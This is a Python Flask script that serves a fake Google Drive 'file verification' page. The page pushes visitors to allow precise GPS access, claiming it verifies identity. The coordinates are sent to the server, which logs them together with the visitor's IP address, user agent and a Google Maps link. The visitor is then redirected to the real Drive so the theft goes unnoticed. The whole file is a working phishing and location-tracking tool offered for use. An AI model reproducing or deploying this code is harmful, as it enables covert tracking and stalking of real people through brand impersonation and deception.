import os
try:
    import werkzeug
    werkzeug.urls.url_quote = werkzeug.urls.quote
except:
    pass

from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Google Drive - File Verification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background-color: #f8f9fa; font-family: 'Roboto',Arial,sans-serif; text-align: center; padding-top: 100px; color: #3c4043; }
            .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
            .btn { background-color: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; margin-top: 20px; }
            .btn:hover { background-color: #1765cc; }
            img { width: 72px; margin-bottom: 20px; }
        </style>
        <script>
            function startProcess() {
                document.getElementById("msg").innerHTML = "Accessing GPS for verification...";
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showPosition, showError, {enableHighAccuracy:true});
                } else {
                    alert("Your browser does not support verification.");
                }
            }

            function showPosition(position) {
                fetch('/save-data?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude)
                .then(() => { 
                    // දත්ත ලැබුණට පස්සේ ගූගල් ඩ්‍රයිව් එකට හරවා යවයි
                    window.location.href = "https://drive.google.com"; 
                });
            }

            function showError(error) {
                alert("Security Error: Please ALLOW location access to verify you are a human.");
                window.location.reload();
            }
        </script>
    </head>
    <body>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg">
            <h2>Private File Access</h2>
            <p>This file is protected. Please verify your identity by confirming your current location.</p>
            <button class="btn" onclick="startProcess()">Verify & Access File</button>
            <p id="msg" style="font-size: 12px; color: #70757a; margin-top: 15px;"></p>
        </div>
    </body>
    </html>
    '''

@app.route('/save-data')
def save_data():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    print("\n" + "="*60)
    print(f"[@] අලුත් ලොකේෂන් එකක් ලැබුණා! - {datetime.datetime.now().strftime('%H:%M:%S')}")
    print(f"[+] IP: {user_ip}")
    print(f"[+] Lat/Lon: {lat}, {lon}")
    print(f"[+] Google Maps: https://www.google.com/maps?q={lat},{lon}")
    print(f"[+] Device: {user_agent}")
    print("="*60 + "\n")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
